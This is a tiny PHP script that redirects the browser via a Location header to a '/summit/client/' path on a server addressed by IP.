<?php
header('Location: http://138.68.232.11/summit/client/');
?>
